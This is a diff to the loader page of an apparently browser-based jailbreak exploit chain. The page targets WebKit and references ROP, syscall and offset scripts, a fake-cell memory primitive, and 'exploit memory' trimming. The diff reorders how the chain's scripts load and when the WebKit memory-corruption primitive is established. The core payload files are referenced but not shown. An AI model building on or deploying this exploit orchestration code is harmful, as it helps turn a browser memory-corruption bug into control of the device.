@@ -266,6 +266,21 @@
     document.getElementById("homeMenu").href = "menu.html?" + q + "&go=1&attempts=12";
 })();
 </script>
+<script src="rop.js"></script>
+<script>
+document.write('<script src="main.js?b=' + encodeURIComponent(window.P2JB_BUILD || "dev") + '"><\/script>');
+</script>
+<script>window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src^="../offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () {
+        rej(new Error("offsets 404: " + s.src));
+    });
+});
+</script>
+<script src="syscalls.js"></script>
 
 <script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js";
 import { installWindowP, pairStatus } from "./mem.js";
@@ -324,42 +339,6 @@ function trimExploitMemory() {
             globalThis.gc();
         }
     } catch (e) { }
-}
-
-function loadScript(src) {
-    return new Promise((resolve, reject) => {
-        const s = document.createElement("script");
-        s.src = src;
-        s.onload = () => resolve();
-        s.onerror = () => reject(new Error("script load failed: " + src));
-        document.head.appendChild(s);
-    });
-}
-
-function waitOffsetsReady() {
-    return new Promise((resolve, reject) => {
-        const s = document.querySelector('script[src^="../offsets/"]');
-        if (!s) return reject(new Error("offsets script was never injected by main.js"));
-        if (typeof OFFSET_wk_vtable_first_element !== "undefined") return resolve(s.src);
-        s.addEventListener("load", () => resolve(s.src));
-        s.addEventListener("error", () => reject(new Error("offsets 404: " + s.src)));
-    });
-}
-
-let chainScriptsPromise = null;
-async function loadChainScripts() {
-    if (chainScriptsPromise) return chainScriptsPromise;
-    const B = encodeURIComponent(window.P2JB_BUILD || "dev");
-    chainScriptsPromise = (async () => {
-        flushMark("CHAIN-SCRIPTS-BEGIN", "deferred-after-webkit");
-        await loadScript("main.js?b=" + B);
-        window.offsetsReady = waitOffsetsReady();
-        await loadScript("rop.js?b=" + B);
-        await loadScript("syscalls.js?b=" + B);
-        await window.offsetsReady;
-        flushMark("CHAIN-SCRIPTS-OK", "main+rop+syscalls+offsets");
-    })();
-    return chainScriptsPromise;
 }
 
 async function settleMemory(ms) {
@@ -1662,15 +1641,10 @@ async function bootChain() {
         stage("boot is taking more than 45 s");
     }, 45000);
     try {
-        refuseReferenceChain();
-        await ensureWebKitPrimitive();
-        if (typeof prepare !== "function") {
-            stage("loading chain scripts — deferred until after WebKit to reduce OOM");
-            await loadChainScripts();
-            await settleMemory(1000);
-        }
         stage("preflight");
         await preflight();
+        refuseReferenceChain();
+        await ensureWebKitPrimitive();
         await ensurePrepare();
     } finally {
         clearTimeout(bootTimer);
@@ -1747,12 +1721,11 @@ async function ensureWebKitPrimitive() {
         if (typeof globalThis.gc === "function") {
             try { globalThis.gc(); } catch (e) { }
         }
-        await settleMemory(1500);
+        // slopkit poops.html: idle turn before prepare()'s worker ROP stack
+        await new Promise(resolve => setTimeout(resolve, 1000));
         flushMark("PRIMITIVE-MEMORY-RELIEF",
             "fake-carrier-dropped=1-history-state-null="
             + (history.state === null));
-        // The landing page preloads the small UI image so it remains visually
-        // stable while this page transitions into its live log view.
         flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
             + "-paired=" + pairStatus.promoted
             + "-released=" + fakeCellReleased());
